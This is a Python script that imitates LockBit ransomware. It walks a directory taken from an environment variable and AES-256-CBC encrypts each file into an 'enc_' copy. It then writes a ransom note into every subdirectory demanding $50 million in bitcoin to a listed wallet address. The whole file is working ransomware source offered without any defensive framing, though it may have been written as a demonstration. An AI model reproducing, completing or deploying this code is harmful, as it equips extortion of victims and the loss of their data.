import os
import secrets
import base64
from dotenv import load_dotenv
from cryptography.fernet import Fernet
from cryptography.hazmat.primitives.ciphers import Cipher, algorithms, modes
from cryptography.hazmat.primitives import padding
from cryptography.hazmat.backends import default_backend

load_dotenv()

user_directory = os.getenv("DIRECTORY")

filesData = os.walk(user_directory)

# Generate a random 32-byte key for AES256
key = secrets.token_bytes(32)

# Generate a random 16-byte IV
iv = secrets.token_bytes(16)

encoded_key = base64.urlsafe_b64encode(key)

with open('mykey.key', 'wb') as mykey:
    mykey.write(encoded_key)

with open('iv.key', 'wb') as myIV:
    myIV.write(iv)

f = Fernet(encoded_key)

# Create an AES256 cipher object with the key and IV
cipher = Cipher(algorithms.AES(key), modes.CBC(iv), backend=default_backend())

for root, directories, files in filesData:
    for file in files:
        # We needn't encrypt the README.md file created
        if file != "README.md":
            sourcePath = root + "\\" + file
            # The encrypted files will be having the prefix enc_ to distinguish between the encrypted and normal files
            encSourcePath = root + "\\enc_" + file

            with open(sourcePath, 'rb') as original_file:
                original = original_file.read()

            # Encrypt the data using AES256-CBC mode
            padder = padding.PKCS7(algorithms.AES.block_size).padder()
            padded_data = padder.update(original) + padder.finalize()
            encryptor = cipher.encryptor()
            encrypted = encryptor.update(padded_data) + encryptor.finalize()

            with open(encSourcePath, 'wb') as encrypted_file:
                encrypted_file.write(encrypted)

    for directory in directories:
        fileName = root + "\\" + directory + "\\README.md"
        fileHandler = open(fileName, "w")

        # To follow the MO of LockBit, post the encryption of the files, we insert a README.md file 
        # containing the instructions to follow in-order to receive the decryption key.

        fileHandler.write(""" 
            This system has been compromized
            You are instructed to transfer $50 million in BTC to 3FZbgi29cpjq2GjdwV8eyHuJJnkLtktZc5
            On transferring the amount, you will get the decryption key.
        """)
